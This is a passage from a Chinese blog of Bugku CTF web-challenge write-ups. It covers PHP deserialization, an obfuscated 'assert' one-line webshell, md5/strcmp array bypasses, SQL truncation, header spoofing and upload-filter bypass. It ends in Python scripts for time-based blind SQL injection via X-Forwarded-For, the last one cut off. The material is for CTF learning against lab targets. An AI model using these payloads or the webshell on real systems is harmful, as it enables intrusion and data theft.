class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将hint.php里Flag类进行序列化，然后作为password的值，又因为我们要使得hint.php里的Flag类定义包含在其中，所以file=hint.php，因此构造以下payload，得到flag。</p><p><code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><h2 id="过狗一句话-代码审计"><a href="#过狗一句话-代码审计" class="headerlink" title="过狗一句话-代码审计"></a>过狗一句话-代码审计</h2><p>看提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">送给大家一个过狗一句话</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$poc = <span class="string">"a#s#s#e#r#t"</span>;</span><br><span class="line">$poc_1 = explode(<span class="string">"#"</span>, $poc);<span class="comment">//explode() 函数把字符串打散为数组。</span></span><br><span class="line">$poc_2 = $poc_1[<span class="number">0</span>] . $poc_1[<span class="number">1</span>] . $poc_1[<span class="number">2</span>] . $poc_1[<span class="number">3</span>] . $poc_1[<span class="number">4</span>] . $poc_1[<span class="number">5</span>];</span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]) </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现poc_2即是assert，assert类似eval，会将内容作为php代码来实现。</p><p>可以构造<code>http://120.24.86.145:8010/?s=print_r(glob(&#39;*.*&#39;))</code>来获得当前目录下的所有文件名中带’.‘的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">glob定义和用法</span><br><span class="line"></span><br><span class="line">glob() 函数返回匹配指定模式的文件名或目录。</span><br><span class="line"></span><br><span class="line">该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。</span><br></pre></td></tr></table></figure><p>又或者构造<code>http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;))</code> 来获得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">scandir定义和用法</span><br><span class="line"></span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">列出 images 目录中的文件和目录：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = <span class="string">"/images/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以升序排序 - 默认</span></span><br><span class="line">$a = scandir($dir);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以降序排序</span></span><br><span class="line">$b = scandir($dir,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">print_r($a);</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即可发现当前目录下有一个flag.txt的文件，直接访问即可。</p><p>别人的wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据提示直接已经构造了assert()可以直接构造语句到s即可。第一步查看文件，system(“ls”)无效，可以只用glob(pattern，flag)来匹配所有符合条件的文件，语句为print_r/var_dump(glob(‘*’))，找到flag.txt文件，输出之即可print_r/var_dump(file/file_get_contents(‘./flag.txt’))或者highlight_file/show_source(‘./flag.txt’)得到flag。</span><br><span class="line"></span><br><span class="line">作者：a2dd56f6ad89</span><br><span class="line">链接：https://www.jianshu.com/p/e91d77d86660</span><br><span class="line">來源：简书</span><br><span class="line">简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</span><br></pre></td></tr></table></figure><h2 id="字符？正则？-代码审计"><a href="#字符？正则？-代码审计" class="headerlink" title="字符？正则？-代码审计"></a>字符？正则？-代码审计</h2><p>按着构造payload就可以了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是<code>key.*</code>这第一块，第一个<code>key</code>直接匹配就好了，然后<code>.</code>可以用任何字符来匹配，*表示之前子表达式匹配零次或多次，所以这一块的意思是以key开头，后面接任意字符串，字符或不接都可以。</p><p>然后是<code>key.{4,7}</code>，这里的<code>{4,7}</code>指的是之前子表达式匹配4次至7次。那么这一块的意思是以key开头，后面接4至7个字符。</p><p>第三块<code>:\/\/(.*key)</code>，前面的<code>:</code>直接匹配就好了，然后的<code>\</code>是为了转义，使得<code>/</code>不为特殊符号，即<code>\/</code>指的就是<code>/</code>，最后的<code>(.*key)</code>是()是拆分成一个字符串，里面的内容和第一个类似，不过是以key结尾而已。总的意思先是一个/，然后接任意符号，再来一个/，再接任意个字符串，字符或不接，最后是一个key。</p><p>最后一块<code>[a-z][[:punct:]]</code>，<code>[a-z]</code>代表匹配a到z的字母，后面的<code>[[:punct:]]</code>匹配的是标点符号。那么这里就是一个小写字符再接一个标点符号即可。</p><p>最后的最后的<code>/i</code>表示的不区分大小写，即可以写KEY。</p><p>最后附上我的payload<code>http://120.24.86.145:8002/web10/index.php?id=keyakeyaaaakey:/a/akeya.</code></p><h3 id="相应的部分正则表达式"><a href="#相应的部分正则表达式" class="headerlink" title="相应的部分正则表达式"></a>相应的部分正则表达式</h3><table><thead><tr><th>符号</th><th>意思</th></tr></thead><tbody><tr><td>\w</td><td>匹配字母或数字或下划线或汉字 等价于 ‘[^A-Za-z0-9_]’。</td></tr><tr><td>.</td><td>匹配除换行符以外的任意字符</td></tr><tr><td>\s</td><td>匹配任意的空白符</td></tr><tr><td>\d</td><td>匹配数字</td></tr><tr><td>^</td><td>匹配字符串的开始</td></tr><tr><td>$</td><td>匹配字符串的结束</td></tr><tr><td>()</td><td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td></tr><tr><td>[]</td><td>是定义匹配的字符范围。比如[a-zA-Z0-9]表示相应位置的字符要匹配英文字符和数字。[\s<em>表示空格或者</em>号]</td></tr><tr><td>{}</td><td>一般是用来匹配的长度。比如\s{3}表示匹配三个空格，\s[1,3]表示匹配1到3个空格</td></tr><tr><td>/i</td><td>不区分大小写 insensitive</td></tr><tr><td>/g</td><td>全局匹配 global</td></tr><tr><td>/m</td><td>多行模式 multi</td></tr><tr><td>/gi 和/ig</td><td>就是/i 和/g的组合</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。要匹配 <em> 字符，请使用 \</em>。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td></tr><tr><td>\</td><td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “\”，而 ‘(‘ 则匹配 “(“。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 \^。</td></tr><tr><td>\</td><td></td><td>指明两项之间的一个选择。要匹配 \</td><td>，请使用 \</td><td>。</td></tr><tr><td>[:punct:]</td><td>匹配任何标点符号</td></tr></tbody></table><h2 id="前女友-SKCTF-代码审计"><a href="#前女友-SKCTF-代码审计" class="headerlink" title="前女友(SKCTF)-代码审计"></a>前女友(SKCTF)-代码审计</h2><p>右键查看源码，可以看见code.txt，打开后发现原来又是绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是v1！=v2，而md5值又要一样，两种方法：</p><p>1.设置v1和v2为数组，md5()在参数是数组时会报错然后返回null，所以两个数组的md5值会恒定相等。</p><p>2.可以利用 “0x” == “0a”的判断结果为1，找出经过加密后的两个md5值以0开头，接下去以都相同的值，直到遇到的字母的两个字符串 ，详情见<code>https://blog.csdn.net/qq_35191331/article/details/77150045</code></p><p>而php中的strcmp(str1,str2)是用来对比字符串，若是str1&gt;str2，则返回1，str1=str2则返回0，str1&lt;str2则返回-1。而这里我们不知道flag变量是什么，所以使得v3为数组，则是数组和字符串对比，会返回false。</p><p>因此构造的payload为<code>118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=3</code></p><h2 id="login1-SKCTF-注入"><a href="#login1-SKCTF-注入" class="headerlink" title="login1(SKCTF)-注入"></a>login1(SKCTF)-注入</h2><p>sql约束攻击，百度一下。原理则是当mysql处于ANSI模式，即宽松模式，在这种模式下插入数据如果不符合定义类型或长度，对数据类型调整或截断保存并警告。  </p><p>在我们注册时，我们将用户名设置为<code>admin                                                    123</code>，他会进行select搜索，搜索数据库里面有没有同名用户，注意，此时是用完整的<code>admin                                                    123</code>进行搜索，所以数据库没有匹配的。</p><p>但是之后的insert操作时，由于字符串长度的问题，所以会造成截断，导致我们的<code>admin                                                    123</code>只会存储进去<code></code>admin<code>一部分和一部分空格，而后面的</code>123`则会被忽略不计，则数据库里面就多了一个记录是admin的，而我们又知道密码的。</p><p>而在之后登陆的时候，在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说”admin”等同于”admin           “，对于绝大多数情况来说都是成立的。因此我们只要输入账号admin，密码为我们所设置的值，然后数据库返回的反而是admin管理员的账号，我们也就可以越权了。</p><p>详情见<code>https://blog.csdn.net/qq_32400847/article/details/54137747</code></p><h2 id="你从哪里来-杂"><a href="#你从哪里来-杂" class="headerlink" title="你从哪里来-杂"></a>你从哪里来-杂</h2><p>打开后是一句<code>are you from google?</code>，很明显就是抓包改信息头。打开bp抓包，然后在里面加入一句<code>Referer: https://www.google.com</code>，然后得到flag了。</p><h2 id="md5-collision-NUPT-CTF-代码审计"><a href="#md5-collision-NUPT-CTF-代码审计" class="headerlink" title="md5 collision(NUPT_CTF)-代码审计"></a>md5 collision(NUPT_CTF)-代码审计</h2><p>bugku就是个**，居然不给源码，谁知道什么意思。百度到了源码。</p><p><img src="/2018/08/10/20180810-bugkuctf-wp/1531147223181.png" alt="1531147223181"></p><p>这里很简单，就是要我们进行MD5碰撞，而这里就用不了神奇的数组绕过了，然而<code>QNKCDZO</code>在md5后的值是<code>0e830400451993494058024219903391</code>，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 </p><p>那么就很简单了，我们只要输入一个md5后的值为0e的即可。</p><p>0e开头md5汇总：<code>https://www.ohlinge.cn/php/0e_md5.html</code></p><h2 id="程序员本地网站-杂"><a href="#程序员本地网站-杂" class="headerlink" title="程序员本地网站-杂"></a>程序员本地网站-杂</h2><p>打开后说从本地访问，那么用bp抓包，然后加上<code>X-Forwarded-For: 127.0.0.1</code>，获得flag。</p><h2 id="各种绕过-代码审计"><a href="#各种绕过-代码审计" class="headerlink" title="各种绕过-代码审计"></a>各种绕过-代码审计</h2><p>直接给源码，按照条件输入即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始的urldecode是对输入的id进行url解码，可是后面的margin属于英语字符，不用编码。</p><p>而后面的uname和passwd要求不相等但是sha1后相等，用数组绕过即可。</p><p>构造的payload为<code>http://120.24.86.145:8002/web7/?id=margin&amp;uname[]=1</code>，并且通过post提交<code>passwd[]=2</code>，得到flag。</p><h2 id="web8-代码审计"><a href="#web8-代码审计" class="headerlink" title="web8-代码审计"></a>web8-代码审计</h2><p>这题一样直接给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac)) &#123;</span><br><span class="line">    $f = trim(file_get_contents($fn));</span><br><span class="line">    <span class="keyword">if</span> ($ac === $f) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> . <span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract函数将字符串里面的变量定义进行了操作，即是输入<code>?a=1&amp;b=2</code>，在本页面也会出现变量<code>$a=1,$b=2</code>，那么按照这个特性，简单的构造即可。</p><p>这里要求的fn又是要求包含文件，而且内容要和我们输入的一致，使用php://input的伪协议绕过即可。构造的payload为<code>http://120.24.86.145:8002/web8/?fn=php://input&amp;ac=1</code>，然后通过post提交<code>1</code>即可得到flag，</p><h2 id="细心-杂"><a href="#细心-杂" class="headerlink" title="细心-杂"></a>细心-杂</h2><p>打开后是404，但是看着不是真正的404，而是写出来的而已，然后看源码，抓包都没有什么发现，最后只能用御剑开始扫描，扫出来一个robots.txt的文件，然后访问，发现resusl.php，访问，看见</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[x]==$password) 此处省略1w字</span><br></pre></td></tr></table></figure><p>想到提示说是变成admin，开个脑洞，直接<code>?x=admin</code>，获得flag。</p><h2 id="求getshell-文件上传-没懂"><a href="#求getshell-文件上传-没懂" class="headerlink" title="求getshell-文件上传-没懂"></a>求getshell-文件上传-没懂</h2><p>看了是文件上传的，说了要上传的是图片而非PHP文件，那么直接上传个图片文件，然后bp抓包。</p><p>以下是百度的结果：</p><p>大佬说这道题是后缀名黑名单检测和类型检测</p><p>如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag。</p><p> <img src="/2018/08/10/20180810-bugkuctf-wp/1531231225563.png" alt="1531231225563"></p><h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>直接就给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>上面的getIp函数，就是获取我们上传的ip地址，则用<code>X-Forwarded-For</code>来提交我们的payload。而<code>$ip_arr = explode(&#39;,&#39;, $ip);return $ip_arr[0];</code>，这里是指以<code>,</code>分离我们的payload成数组，并返回数组的第一个，说明我们提交的payload不能出现逗号。</p><p>下面<code>$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</code>则是一个注入点，题目也说了是insert into注入，那就简单了，构造相应的payload即可。而<code>error_reporting(0);</code>关闭了错误回显，insert注入本身又没有回显，所以要用别的方法来注入，我选的是基于时间的注入。</p><p>重点的payload为：<code>1&#39;+(select case when (substring((select database()) from &quot;+str(pos)+&quot; for 1)=&#39;&quot;+str(word)+&quot;&#39;) then sleep(5) else 1 end) and &#39;1</code>。</p><p><code>select case when a else b end</code>，这个格式就是当case为真时，运行a，否则运行b。</p><p><code>substring((select database()) from &quot;+str(pos)+&quot; for 1)=&#39;&quot;+str(word)+&quot;&#39;)</code>，这里是因为不能用<code>,</code>，所以就用<code>from 1 for 1</code>来表示1,1，这里相当于<code>substring((select database()) 1,1)</code></p><p>爆数据库的注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words=<span class="string">'1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIUYTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~'</span></span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">keyword=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):    <span class="comment">#设长度小于100</span></span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">"1'+(select case when (substring((select database()) from "</span>+str(pos)+<span class="string">" for 1)='"</span>+str(word)+<span class="string">"') then sleep(5) else 1 end) and '1"</span>&#125;</span><br><span class="line">            r=s.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">            <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:  <span class="comment">#超时的操作，超时表示匹配成功</span></span><br><span class="line">            keyword+=str(word)</span><br><span class="line">            <span class="keyword">print</span> str(pos)+<span class="string">'---'</span>+str(word)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> keyword</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words=<span class="string">'1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIUYTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~'</span></span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">keyword=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    keyword=<span class="string">''</span></span><br><span class="line">    flag1=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):    <span class="comment">#设长度小于100</span></span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">"1'+(select case when (substring((select table_name from information_schema.tables where table_schema=database() limit 1 offset "</span>+str(i)+<span class="string">") from "</span>+str(pos)+<span class="string">" for 1)='"</span>+str(word)+<span class="string">"') then sleep(5) else 1 end) and '1"</span>&#125;</span><br><span class="line">                r=s.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">                <span class="comment">#print r.text</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:  <span class="comment">#超时的操作，超时表示匹配成功</span></span><br><span class="line">                keyword+=str(word)</span><br><span class="line">                <span class="keyword">print</span> str(pos)+<span class="string">'---'</span>+str(word)</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                flag1=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> keyword</span><br><span class="line">    <span class="keyword">if</span>(flag1==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words=<span class="string">'1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIUYTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~'</span></span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">keyword=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    keyword=<span class="string">''</span></span><br><span class="line">    flag1=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):    <span class="comment">#设长度小于100</span></span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">"1'+(select case when (substring((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1 offset "</span>+str(i)+<span class="string">") from "</span>+str(pos)+<span class="string">" for 1)='"</span>+str(word)+<span class="string">"') then sleep(5) else 1 end) and '1"</span>&#125;</span><br><span class="line">                r=s.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">                <span class="comment">#print r.text</span></span><br><span class="line">            <span 